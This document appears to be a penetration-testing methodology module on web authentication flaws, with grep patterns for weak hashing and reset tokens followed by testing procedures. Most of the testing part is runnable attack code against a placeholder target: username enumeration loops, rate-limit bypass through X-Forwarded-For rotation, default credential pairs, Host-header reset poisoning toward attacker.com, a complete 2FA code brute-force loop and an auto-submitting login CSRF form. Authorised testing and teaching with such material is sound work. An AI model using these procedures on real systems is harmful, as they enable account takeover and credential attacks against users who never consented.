# VULN MODULE — Authentication Flaws (Full)
# Asset: webapp
# CWE-287 family | Report prefix: WEB-AUTH

## THREAT MODEL

Authentication flaws allow attackers to access accounts or resources
without valid credentials. Distinct from authorization/IDOR (which assume
a valid account). Auth flaws break the login boundary itself.

## VULNERABILITY CLASSES

1. Username enumeration                 CWE-204
2. Brute force / credential stuffing    CWE-307
3. Default credentials                  CWE-798
4. Password reset flaws                 CWE-640
5. Multi-factor authentication bypass   CWE-287
6. Account lockout bypass               CWE-307
7. Insecure "remember me" token         CWE-613
8. Login CSRF                           CWE-352
9. Username/password in GET params      CWE-598
10. Plaintext credential storage        CWE-256

## WHITEBOX PATTERNS

```bash
# Password hashing — detect weak algorithms
grep -rn "md5(\|sha1(\|sha256(\b" --include="*.php" --include="*.py"
grep -rn "MessageDigest.*MD5\|MessageDigest.*SHA-1" --include="*.java"
# Should use: bcrypt, argon2, scrypt — NOT raw hash functions

# Account lockout logic (or lack thereof)
grep -rn "login_attempts\|failed_login\|lockout\|throttle" \
  --include="*.php" --include="*.py" --include="*.js"

# Password reset token generation
grep -rn "reset_token\|forgot_password\|generate_token\|rand(\|random(" \
  --include="*.php" --include="*.py"
# Weak: md5(time()), rand(), uniqid() — all predictable

# Credentials in URLs or logs
grep -rn "password.*=.*\$_GET\|password.*request\.GET\|pass.*query\[" \
  --include="*.php" --include="*.py"

# Remember-me token storage
grep -rn "remember_token\|persistent_session\|keep_logged_in" \
  --include="*.php" --include="*.py"

# 2FA implementation
grep -rn "otp\|totp\|mfa\|two_factor\|authenticator" \
  --include="*.php" --include="*.py" --include="*.js" -i
```

## TESTING PROCEDURES

### 1. Username Enumeration
```bash
# Timing-based enumeration: valid user = different response time
for user in admin administrator root user test; do
  time curl -s -X POST https://target.com/login \
    -d "username=$user&password=WRONG" > /dev/null
done

# Response-based enumeration: different error messages
curl -s -X POST https://target.com/login \
  -d "username=admin@target.com&password=wrong" | grep -i "password\|user\|invalid"
curl -s -X POST https://target.com/login \
  -d "username=notexist@target.com&password=wrong" | grep -i "password\|user\|invalid"
# Different messages = username enumeration

# Registration endpoint enumeration
curl -s -X POST https://target.com/register \
  -d "username=admin&password=test" | grep -i "exists\|taken\|already"

# Password reset enumeration
curl -s -X POST https://target.com/forgot-password \
  -d "email=admin@target.com" | grep -i "sent\|not found\|invalid"
```

### 2. Brute Force & Rate Limiting
```bash
# Test rate limiting on login
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " -X POST https://target.com/login \
    -d "username=admin&password=wrong$i"
done
# If all return 200/302 without lockout → no rate limiting

# IP rotation bypass (if rate limit is IP-based)
curl -s -X POST https://target.com/login \
  -H "X-Forwarded-For: 1.2.3.$i" \
  -d "username=admin&password=Password1"

# Account lockout bypass — does lockout apply per IP or per account?
# Try from different IPs or with X-Forwarded-For header rotation
```

### 3. Default Credentials
```bash
# Common default credential pairs to test on login forms:
# admin:admin, admin:password, admin:123456, admin:admin123
# root:root, root:toor, root:password
# user:user, test:test, guest:guest
# [application_name]:[application_name]

# Also check: setup/installation pages, API documentation credentials
curl -s https://target.com/api/v1/users \
  -H "Authorization: Basic $(echo -n 'admin:admin' | base64)"
```

### 4. Password Reset Flaws
```bash
# a) Host header injection → token sent to attacker
curl -s -X POST https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@target.com"
# Check: does reset email contain link to attacker.com?

# b) Token predictability
# Request reset for two accounts quickly:
TOKEN1=$(curl -s ... | grep -o 'token=[^&"]*' | cut -d= -f2)
TOKEN2=$(curl -s ... | grep -o 'token=[^&"]*' | cut -d= -f2)
echo "Token 1: $TOKEN1"
echo "Token 2: $TOKEN2"
# Analyze: sequential? time-based? hash of email?

# c) Token reuse — use same token twice
curl -s "https://target.com/reset?token=$TOKEN&password=NewPass1"
curl -s "https://target.com/reset?token=$TOKEN&password=NewPass2"
# Second request should fail if token is invalidated

# d) Token not expiring — wait >24h, then try
# e) Token in HTTP Referer — click a link on the reset page, check Referer header on next site

# f) No token at all — parameter manipulation
curl -s "https://target.com/reset-password" \
  -d "email=victim@target.com&new_password=hacked"
```

### 5. 2FA Bypass
```bash
# a) Direct endpoint access — skip 2FA step entirely
# After entering valid password (step 1), skip 2FA step and go directly to dashboard
curl -s https://target.com/dashboard \
  -H "Cookie: session=PARTIAL_AUTH_SESSION"

# b) Response manipulation (if 2FA result is checked client-side)
# In Burp: intercept 2FA verification response
# Change: {"success":false,"mfa_required":true} → {"success":true}

# c) Code reuse — use the same TOTP code twice
# d) Code bruteforce — 6-digit code = 1,000,000 combinations
for code in $(seq -f "%06g" 0 999999); do
  result=$(curl -s -X POST https://target.com/verify-2fa \
    -d "code=$code" -H "Cookie: session=SESS")
  if echo "$result" | grep -q "success\|dashboard"; then
    echo "VALID CODE: $code"; break
  fi
done

# e) Backup code abuse — if backup codes are shown once, are they stored hashed?
# f) 2FA not enforced on API — web requires 2FA but API endpoints do not

# g) Remember device cookie — is it cryptographically signed? Can it be forged?
# Decode the "remember this device" cookie and check its format
```

### 6. Login CSRF
```html
<!-- If login form has no CSRF token, attacker can log victim into attacker's account -->
<!-- This enables stored XSS → account takeover chain -->
<form method="POST" action="https://target.com/login">
  <input name="username" value="attacker@evil.com">
  <input name="password" value="attacker_password">
  <input type="submit" value="Submit" onclick="this.form.submit()">
</form>
<script>document.forms[0].submit();</script>
```

### 7. "Remember Me" Token Analysis
```bash
# Decode the persistent cookie
base64 -d <<< "COOKIE_VALUE"
# Check: is it predictable? Does it contain username/id in plain text?
# Is it tied to a specific session on server side?

# Test token scope: does one remember-me token work for multiple accounts?
# Test token invalidation: does logout invalidate the persistent token?
```
